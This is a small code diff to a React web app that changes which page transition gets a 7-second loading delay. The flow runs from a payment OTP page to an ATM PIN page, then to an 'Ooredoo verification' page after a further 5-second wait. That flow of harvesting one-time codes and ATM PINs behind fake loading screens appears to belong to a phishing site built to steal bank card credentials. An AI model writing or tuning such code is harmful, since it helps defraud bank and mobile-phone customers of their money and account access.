@@ -37,11 +37,11 @@ const AppContent = () => {
     setIsLoading(true);
     
     // Custom loading durations for specific transitions
-    const isPaymentToATM = previousPath === "/registration-complete" && location.pathname === "/atm-pin";
+    const isOTPToATM = previousPath === "/payment-otp" && location.pathname === "/atm-pin";
     const isATMToNext = previousPath === "/atm-pin" && location.pathname === "/ooredoo-verification";
     
     let loadingDuration = 1500; // Default 1.5 seconds
-    if (isPaymentToATM) {
+    if (isOTPToATM) {
       loadingDuration = 7000; // 7 seconds for payment to ATM PIN
     } else if (isATMToNext) {
       loadingDuration = 5000; // 5 seconds after ATM PIN
